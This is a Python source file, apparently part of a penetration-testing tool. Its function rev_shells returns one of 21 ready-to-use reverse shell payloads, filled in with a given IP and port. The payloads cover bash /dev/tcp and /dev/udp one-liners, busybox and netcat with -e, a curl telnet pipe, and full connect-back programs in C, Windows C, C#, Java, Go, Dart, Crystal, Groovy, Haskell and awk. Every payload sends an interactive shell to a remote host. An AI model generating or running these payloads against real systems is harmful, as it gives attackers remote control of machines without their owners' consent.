# Define a function to generate reverse shell commands based on user inputs
def rev_shells(num, ip, port, shell):
    # Convert the port to a string
    port = str(port)
  
    # Define different reverse shell commands for various languages
    awk = '''awk 'BEGIN {s = "/inet/tcp/0/'''+ip+"/"+port+'''"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null'''
    bash_i = f"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1"
    bash_5 = f"{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5"
    bash_196 = f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196"
    bash_rl = f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"
    bash_udp = f"{shell} -i >& /dev/udp/{ip}/{port} 0>&1"
    busyBox = f"busybox nc {ip} {port} -e {shell}"
    c_sharp_tcp = '''
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("'''+ip+'''", '''+port+'''))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "zsh";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}'''
    c_sharp_bash = '''
using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();
	  proc.StartInfo.FileName = "'''+shell+'''";
	  proc.StartInfo.Arguments = "-c \\"'''+shell+''' -i >& /dev/tcp/'''+ip+'''/'''+port+''' 0>&1\\"";
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}'''
    c = '''
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = '''+port+''';
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("'''+ip+'''");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"'''+shell+'''", NULL};
    execve("'''+shell+'''", argv, NULL);

    return 0;       
}'''
    c_windows = '''
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "'''+ip+'''"; 
char port[6] = "'''+port+'''";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}'''
    crystal_code = '''
require "process"
require "socket"

c = Socket.tcp(Socket::Family::INET)
c.connect("'''+ip+'''", '''+port+''')
loop do 
  m, l = c.receive
  p = Process.new(m.rstrip("\n"), output:Process::Redirect::Pipe, shell:true)
  c << p.output.gets_to_end
end'''
    crystal_system = '''crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("'''+ip+'''",'''+port+''');loop{m,l=c.receive;p=Process.new(m.rstrip("\\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}\''''
    curl = f'''C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null'''
    dart = '''
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("'''+ip+'''", '''+port+''').then((socket) {
    socket.listen((data) {
      Process.start(\''''+shell+'''\', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}'''

    groovy = '''String host="'''+ip+'''";int port='''+port+''';String cmd="'''+shell+'''";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'''

    go = '''echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","'''+ip+''':'''+port+'''");cmd:=exec.Command("'''+shell+'''");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'''

    heskell = '''
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |'''+shell+''' -i 2>&1 | nc '''+ip+''' '''+port+''' >/tmp/f"'''

    java_1 = '''
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/'''+ip+'''/'''+port+''' 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}'''

    java_2 = '''
public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/'''+ip+'''/'''+port+''' 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}'''

    java_3 = '''
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "'''+ip+'''";
        int port = '''+port+''';
        String cmd = "'''+shell+'''";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}'''

# Select and return the appropriate reverse shell command based on user input
    if num == 1:
        return awk
    elif num == 2:
        return bash_i
    elif num == 3:
        return bash_5
    elif num == 4:
        return bash_196
    elif num == 5:
        return bash_rl
    elif num == 6:
        return bash_udp
    elif num == 7:
        return busyBox
    elif num == 8:
        return c_sharp_tcp
    elif num == 9:
        return c_sharp_bash
    elif num == 10:
        return c
    elif num == 11:
        return c_windows
    elif num == 12:
        return crystal_code
    elif num == 13:
        return crystal_system
    elif num == 14:
        return curl
    elif num == 15:
        return dart
    elif num == 16:
        return groovy
    elif num == 17:
        return go
    elif num == 18:
        return heskell
    elif num == 19:
        return java_1
    elif num == 20:
        return java_2
    elif num == 21:
        return java_3
    else:
        return 0
